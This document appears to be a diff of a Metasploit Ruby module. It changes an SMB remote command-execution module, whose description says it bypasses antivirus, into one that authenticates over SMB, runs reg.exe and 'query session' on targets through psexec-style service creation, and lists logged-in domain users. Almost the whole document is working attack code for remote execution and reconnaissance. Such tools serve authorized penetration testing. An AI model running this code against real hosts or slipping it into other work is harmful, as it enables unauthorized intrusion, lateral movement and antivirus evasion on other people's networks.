@@ -1,7 +1,6 @@
 #!/usr/bin/env ruby
 
 require 'msf/core'
-
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
@@ -16,30 +15,29 @@ class Metasploit3 < Msf::Auxiliary
 	XCEPT  = Rex::Proto::SMB::Exceptions
 	CONST  = Rex::Proto::SMB::Constants
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'SMB - Execute Windows Command',
-			'Description'    => %q{This module executes a *single* windows command on one or more hosts
-				by authenticating over SMB and passing a dcerpc request.  Daisy chaining commands wiht '&'
-				does not work and you shouldn't try it.  It steals code from the psexec
-				module so thanks very much to the author/s of that great tool.  This module is useful
-				because it does not need to upload any binaries to the target machine and therefore
-				should bypass most if not all Antivirus solutions
+	def initialize
+		super(
+			'Name'        => 'SMB - Query Logged On Users',
+			'Version'     => '$Revision: 14976 $',
+			'Description' => %Q{
+				This module authenticates to a remote host or hosts and determines which users are currently logged in.  It uses reg.exe
+				to query the HKU base registry key.
 			},
-
-			'Author'         => [
-				'Royce @R3dy__ Davis <rdavis[at]accuvant.com>',
+			'Author'      =>
+				[
+					'Royce Davis <rdavis[at]accuvant.com>',    # Metasploit module
+					'Twitter: <[at]R3dy__>',
+				],
+			'References'  => [
+				['URL', 'http://www.pentestgeek.conm'],
+				['URL', 'http://www.accuvant.com'],
 			],
-
-			'License'        => MSF_LICENSE,
-			'References'     => [
-				[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
-			],
-		))
+			'License'     => MSF_LICENSE
+		)
 
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
-			OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
+			OptString.new('USERNAME', [false, 'The name of a specific user to search for', '']),
 			OptString.new('RPORT', [true, 'The Target port', 445]),
 		], self.class)
 
@@ -48,60 +46,64 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	# This is the main controle method
+	# This is the main controller function
 	def run_host(ip)
+		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
+		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
-		bat = "%WINDIR%\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		smbshare = datastore['SMBSHARE']
 
 		#Try and authenticate with given credentials
-		if connect
-			begin
-				smb_login
-			rescue StandardError => autherror
-				print_error("Unable to authenticate with given credentials: #{autherror}")
-				return
-			end
-			if execute_command(smbshare, ip, text, bat)
-				o = get_output(smbshare, ip, text)
-			end
-			cleanup_after(smbshare, ip, text, bat)
-			disconnect
-		end
-	end
-
-
-
-	# Executes specified Windows Command
-	def execute_command(smbshare, ip, text, bat)
 		begin
-			#Try and execute the provided command
-			execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
+			connect()
+			smb_login()
+		rescue StandardError => autherror
+			print_error("#{ip} - #{autherror}")
+			return
+		end
+
+		keys = get_hku(ip, smbshare, cmd, text, bat)
+		if !keys
+			cleanup_after(smbshare, ip, cmd, text, bat)
+			return
+		end
+		keys.each do |key|
+			check_hku_entry(key, ip, smbshare, cmd, text, bat)
+		end
+		cleanup_after(smbshare, ip, cmd, text, bat)
+		disconnect()
+	end
+
+
+
+	# This method runs reg.exe query HKU to get a list of each key within the HKU master key
+	# Returns an array object
+	def get_hku(ip, smbshare, cmd, text, bat)
+		begin
+			# Try and query HKU
+			command = "#{cmd} /C echo reg.exe QUERY HKU ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
 			simple.connect(smbshare)
-			print_status("Executing your command on host: #{ip}")
-			psexec(smbshare, execute)
-			return true
-		rescue StandardError => execerror
-			print_error("#{ip} - Unable to execute specified command: #{execerror}")
-			return false	
+			psexec(smbshare, command)
+			output = get_output(ip, smbshare, text)
+			cleanout = Array.new
+			output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_")}
+			return cleanout
+		rescue StandardError => hku_error
+			print_error("#{ip} - Error runing query against HKU. #{hku_error.class}. #{hku_error}")
+			return nil
 		end
 	end
 
 
 
-	# Retrive output from command
-	def get_output(smbshare, ip, file)
+	# This method will retrive output from a specified textfile on the remote host
+	def get_output(ip, smbshare, file)
 		begin
 			simple.connect("\\\\#{ip}\\#{smbshare}")
 			outfile = simple.open(file, 'ro')
 			output = outfile.read
 			outfile.close
 			simple.disconnect("\\\\#{ip}\\#{smbshare}")
-			if output.empty?
-				print_status("Command finished with no output")
-				return
-			end
-			print_good("Command completed successfuly! Output from: #{ip}\r\n#{output}")
 			return output
 		rescue StandardError => output_error
 			print_error("#{ip} - Error getting command output. #{output_error.class}. #{output_error}.")
@@ -111,17 +113,60 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	# This is the cleanup method, removes .txt and .bat file/s created during execution-
-	def cleanup_after(smbshare, ip, text, bat)
+	# This method checks a provided HKU entry to determine if it is a valid SID
+	# Either returns nil or returns the name of a valid user
+	def check_hku_entry(key, ip, smbshare, cmd, text, bat)
+		begin
+			key = key.split("HKEY_USERS\\")[1].chomp
+			command = "#{cmd} /C echo reg.exe QUERY \"HKU\\#{key}\\Volatile Environment\" ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
+			simple.connect(smbshare)
+			psexec(smbshare, command)
+			if output = get_output(ip, smbshare, text)
+				domain, username, dnsdomain = "","",""
+				# Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
+				if datastore['USERNAME'].length > 0
+					output.each_line do |line|
+						username = line if line.include?("USERNAME")
+						domain = line if line.include?("USERDOMAIN")
+					end
+					if domain.split(" ")[2].to_s.chomp + "\\" + username.split(" ")[2].to_s.chomp == datastore['USERNAME']
+						print_good("#{datastore['USERNAME']} logged into #{ip}")
+					end
+					return
+				end
+				output.each_line do |line|
+					domain = line if line.include?("USERDOMAIN")
+					username = line if line.include?("USERNAME")
+					dnsdomain = line if line.include?("USERDNSDOMAIN")
+				end
+				if username.length > 0 && domain.length > 0
+					print_good("#{ip} - #{domain.split(" ")[2].to_s}\\#{username.split(" ")[2].to_s}")
+				else
+					if username = query_session(smbshare, ip, cmd, text, bat)
+						print_good("#{ip} - #{dnsdomain.split(" ")[2].split(".")[0].to_s}\\#{username}")
+					else
+						print_status("#{ip} - Unable to determine user information for user: #{key}")
+					end
+				end
+			else
+				print_status("#{ip} - Could not determine logged in users")
+			end
+		rescue StandardError => check_error
+			print_error("#{ip} - Error checking reg key. #{check_error.class}. #{check_error}")
+			return check_error
+		end
+	end
+
+
+
+	# Cleanup module.  Gets rid of .txt and .bat files created in the WINDOWS\Temp directory
+	def cleanup_after(smbshare, ip, cmd, text, bat)
 		begin
 			# Try and do cleanup command
-			cleanup = "%COMSPEC% /C del %SYSTEMDRIVE%#{text} & del #{bat}"
+			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
 			simple.connect(smbshare)
 			print_status("Executing cleanup on host: #{ip}")
 			psexec(smbshare, cleanup)
-			#if !check_cleanup(smbshare, ip, text)
-			#	print_error("#{ip} - Unable to cleanup.  Need to manually remove #{text} and #{bat} from the target.")
-			#end
 		rescue StandardError => cleanuperror
 			print_error("Unable to processes cleanup commands: #{cleanuperror}")
 			return cleanuperror
@@ -130,15 +175,22 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	def check_cleanup(smbshare, ip, text)
-		simple.connect("\\\\#{ip}\\#{smbshare}")
-		if checktext = simple.open(text, 'ro')
-			check = false
-		else
-			check = true
+	# Method trys to use "query session" to determine logged in user
+	def query_session(smbshare, ip, cmd, text, bat)
+		begin
+			command = "#{cmd} /C echo query session ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
+			simple.connect(smbshare)
+			psexec(smbshare, command)
+			userline = ""
+			if output = get_output(ip, smbshare, text)
+				output.each_line { |line| userline << line if line[0] == '>' }
+			else
+				return nil
+			end
+			return userline.split(" ")[1].chomp
+		rescue
+			return nil
 		end
-		simple.disconnect("\\\\#{ip}\\#{smbshare}")
-		return check
 	end
 
 
@@ -246,7 +298,7 @@ class Metasploit3 < Msf::Auxiliary
 		vprint_status("Removing the service...")
 		stubdata =
 			svc_handle +
-			NDR.wstring("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
+			NDR.wstring("C:\\WINDOWS\\Temp\\sam")
 		begin
 			response = dcerpc.call(0x02, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
@@ -268,10 +320,10 @@ class Metasploit3 < Msf::Auxiliary
 			#This is not really useful but will prevent double \\ on the wire :)
 		if datastore['SHARE'] =~ /.[\\\/]/
 			simple.connect(smbshare)
-			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
+			simple.delete("C:\\WINDOWS\\Temp\\sam")
 		else
 			simple.connect(smbshare)
-			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
+			simple.delete("C:\\WINDOWS\\Temp\\sam")
 		end
 
 		rescue ::Interrupt
